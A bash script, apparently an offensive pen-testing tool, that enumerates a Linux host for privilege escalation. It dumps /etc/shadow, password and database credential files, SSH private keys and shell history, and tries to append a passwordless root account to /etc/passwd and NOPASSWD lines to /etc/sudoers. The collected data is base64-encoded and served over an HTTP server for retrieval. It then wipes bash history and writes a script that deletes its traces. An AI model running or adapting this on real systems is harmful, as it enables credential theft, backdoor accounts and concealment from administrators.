#!/bin/bash
#wget https://github.com/h1dz/Pen-Testing/blob/BashScripts/priv3num.sh
#chmod +x priv3num
#Usage:        			  ./priv3num <RHOST> <LPORT>

#This script will enumerate information used for privilege escalation

B='\033[0;96m' #${B}
G='\033[0;92m' #${G}
R='\033[0;91m' #${R}
N='\033[0m'    #${N}

printf "${B}\n------------------------------Start------------------------------\n\n${G}" >> priv
date >> priv
printf "${B}\n------------------------------IP------------------------------\n\n${G}" >> priv
ip addr show >> priv
printf "${B}\n------------------------------OS info------------------------------\n\n${G}" >> priv
uname -a >> priv
cat /etc/*-release >> priv
cat /proc/version >> priv
printf "${B}\n------------------------------Bash version------------------------------\n\n${G}" >> priv
bash --version  >> priv
printf "${B}\n------------------------------Sudo version------------------------------\n\n${G}" >> priv
sudo -V	 >> priv
printf "${B}\n------------------------------User------------------------------\n\n${R}" >> priv
whoami >> priv
printf "${B}\n------------------------------Host------------------------------\n\n${R}" >> priv
hostname >> priv
dnsdomainname >> priv
printf "${B}\n------------------------------ID------------------------------\n\n${G}" >> priv
id >> priv
printf "${B}\n------------------------------Sudo privileges------------------------------\n\n${R}" >> priv
sudo -l >> priv
printf "${B}\n------------------------------Path------------------------------\n\n${G}" >> priv
echo $PATH >> priv
printf "${B}\n------------------------------Directory------------------------------\n\n${R}" >> priv
pwd >> priv
printf "${B}\n------------------------------Dir file contents------------------------------\n\n${G}" >> priv
ls -la >> priv
printf "${B}\n------------------------------Root file contents------------------------------\n\n${G}" >> priv
ls -al /root >> priv
printf "${B}\n------------------------------Home file contents------------------------------\n\n${G}" >> priv
ls -al /home/* >> priv
printf "${B}\n------------------------------Processes running root------------------------------\n\n${G}" >> priv
ps aux | grep root >> priv
printf "${B}\n------------------------------Passwd------------------------------\n\n${R}" >> priv
cat /etc/passwd >> priv
printf "${B}\n------------------------------Old passwd------------------------------\n\n${R}" >> priv
cat /etc/security/opasswd >> priv
printf "${B}\n------------------------------Shadow------------------------------\n\n${R}" >> priv
cat /etc/shadow  >> priv
printf "${B}\n------------------------------writeable passwd------------------------------\n\n${R}" >> priv
echo 'test::0:0::/root:/bin/bash' >> /etc/passwd >> priv
printf "${B}\n------------------------------possbile passwd files------------------------------\n\n${R}" >> priv
cat /var/apache2/config.inc >> priv
cat /var/lib/mysql/mysql/user.MYD >> priv
cat /root/anaconda-ks.cfg >> priv
printf "${B}\n------------------------------writeable sudoers------------------------------\n\n${R}" >> priv
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers >> priv
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers >> priv
cat /etc/sudoers >> priv
printf "${B}\n------------------------------Crontabs------------------------------\n\n${R}" >> priv
cat /etc/crontab >> priv
crontab -l >> priv
printf "${B}\n------------------------------Exports------------------------------\n\n${R}" >> priv
cat /etc/exports >> priv
printf "${B}\n------------------------------Hosts------------------------------\n\n${R}" >> priv
cat /etc/hosts >> priv
printf "${B}\n------------------------------SUID1------------------------------\n\n${R}" >> priv
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null >> priv
printf "${B}\n------------------------------SUID2------------------------------\n\n${R}" >> priv
find / -perm -u=s -type f 2>/dev/null >> priv
printf "${B}\n------------------------------Find id_rsa------------------------------\n\n${R}" >> priv
find / -name id_rsa 2> /dev/null >> priv
printf "${B}\n------------------------------Root id_rsa------------------------------\n\n${R}" >> priv
cat /root/.ssh/id_rsa  >> priv
printf "${B}\n------------------------------Root id_key------------------------------\n\n${R}" >> priv
cat /root/.ssh/id_key  >> priv
printf "${B}\n------------------------------User id_rsa------------------------------\n\n${R}" >> priv
cat ~/.ssh/id_rsa  >> priv
printf "${B}\n------------------------------User id_key------------------------------\n\n${R}" >> priv
cat ~/.ssh/id_key  >> priv
printf "${B}\n------------------------------Open ports------------------------------\n\n${G}" >> priv
nc -z -v $1 20-3389 2>&1 | grep succeeded >> priv									#<RHOST>
printf "${B}\n------------------------------Bash history------------------------------\n\n${G}" >> priv
cat ~/.*history | less  >> priv
printf "${B}\n------------------------------Finished------------------------------\n\n" >> priv
clear
echo "#!/bin/bash" >> webserver
echo "python3 -m http.server $2" >> webserver											#<LPORT>
base64 priv -w 0 >> 2
echo "#!/bin/bash" >> remove
echo "rm -r 2" >> remove
echo "rm -r priv3num" >> remove
echo "rm -r priv" >> remove
echo "rm -r webserver" >> remove
echo "rm -r remove" >> remove
#start reverse shell
chmod +x webserver
chmod +x remove
cat /dev/null > ~/.bash_history && history -c
./webserver
